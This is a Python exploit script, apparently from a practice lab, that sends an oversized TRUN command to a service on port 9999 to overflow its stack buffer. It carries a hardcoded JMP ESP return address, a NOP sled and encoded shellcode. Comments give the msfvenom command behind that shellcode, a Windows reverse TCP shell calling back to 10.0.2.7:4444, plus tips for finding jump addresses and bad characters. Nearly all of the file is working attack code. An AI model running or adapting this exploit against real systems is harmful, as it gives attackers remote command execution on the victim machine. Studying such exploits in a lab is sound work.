import socket
import sys

#used nasm_shell.rb in /usr/share/metasploit-framework/tools/exploit and run 'JMP ESP' on shell to find the pointer on server. \xff\xe4 with mona on immunity
#if 'JMP ESP' didn't work so use other assembly codes. check it out on web
#625011af
overflowPayload = ("\xdb\xde\xb8\xc7\xab\x75\xc4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"                            
"\x52\x31\x42\x17\x03\x42\x17\x83\x05\xaf\x97\x31\x75\x58\xd5"                            
"\xba\x85\x99\xba\x33\x60\xa8\xfa\x20\xe1\x9b\xca\x23\xa7\x17"                            
"\xa0\x66\x53\xa3\xc4\xae\x54\x04\x62\x89\x5b\x95\xdf\xe9\xfa"                            
"\x15\x22\x3e\xdc\x24\xed\x33\x1d\x60\x10\xb9\x4f\x39\x5e\x6c"                            
"\x7f\x4e\x2a\xad\xf4\x1c\xba\xb5\xe9\xd5\xbd\x94\xbc\x6e\xe4"                            
"\x36\x3f\xa2\x9c\x7e\x27\xa7\x99\xc9\xdc\x13\x55\xc8\x34\x6a"                            
"\x96\x67\x79\x42\x65\x79\xbe\x65\x96\x0c\xb6\x95\x2b\x17\x0d"                            
"\xe7\xf7\x92\x95\x4f\x73\x04\x71\x71\x50\xd3\xf2\x7d\x1d\x97"                            
"\x5c\x62\xa0\x74\xd7\x9e\x29\x7b\x37\x17\x69\x58\x93\x73\x29"                            
"\xc1\x82\xd9\x9c\xfe\xd4\x81\x41\x5b\x9f\x2c\x95\xd6\xc2\x38"                            
"\x5a\xdb\xfc\xb8\xf4\x6c\x8f\x8a\x5b\xc7\x07\xa7\x14\xc1\xd0"                            
"\xc8\x0e\xb5\x4e\x37\xb1\xc6\x47\xfc\xe5\x96\xff\xd5\x85\x7c"                            
"\xff\xda\x53\xd2\xaf\x74\x0c\x93\x1f\x35\xfc\x7b\x75\xba\x23"                            
"\x9b\x76\x10\x4c\x36\x8d\xf3\x79\xc7\x8f\x04\x16\xc5\x8f\x1b"                            
"\xba\x40\x69\x71\x52\x05\x22\xee\xcb\x0c\xb8\x8f\x14\x9b\xc5"                            
"\x90\x9f\x28\x3a\x5e\x68\x44\x28\x37\x98\x13\x12\x9e\xa7\x89"                            
"\x3a\x7c\x35\x56\xba\x0b\x26\xc1\xed\x5c\x98\x18\x7b\x71\x83"                            
"\xb2\x99\x88\x55\xfc\x19\x57\xa6\x03\xa0\x1a\x92\x27\xb2\xe2"                            
"\x1b\x6c\xe6\xba\x4d\x3a\x50\x7d\x24\x8c\x0a\xd7\x9b\x46\xda"                            
"\xae\xd7\x58\x9c\xae\x3d\x2f\x40\x1e\xe8\x76\x7f\xaf\x7c\x7f"                            
"\xf8\xcd\x1c\x80\xd3\x55\x3c\x63\xf1\xa3\xd5\x3a\x90\x09\xb8"                            
"\xbc\x4f\x4d\xc5\x3e\x65\x2e\x32\x5e\x0c\x2b\x7e\xd8\xfd\x41"                            
"\xef\x8d\x01\xf5\x10\x84")
stringtosend = "TRUN /.:/" + "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflowPayload #if didn't work, write \x62\x50\x11\xaf it depends on how the servers ram works. try \x90 times until it works but if the machine has a byte limit, be aware of that
#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.7 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" \x00 means bad character. if the the machine had more, than we have to write it there.

try:
    mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mysocket.connect(("10.0.2.15", 9999))
    bytes = stringtosend.encode(encoding="latin1")
    mysocket.send(bytes)
    mysocket.close()
except Exception as e:
    print(e)
    sys.exit()
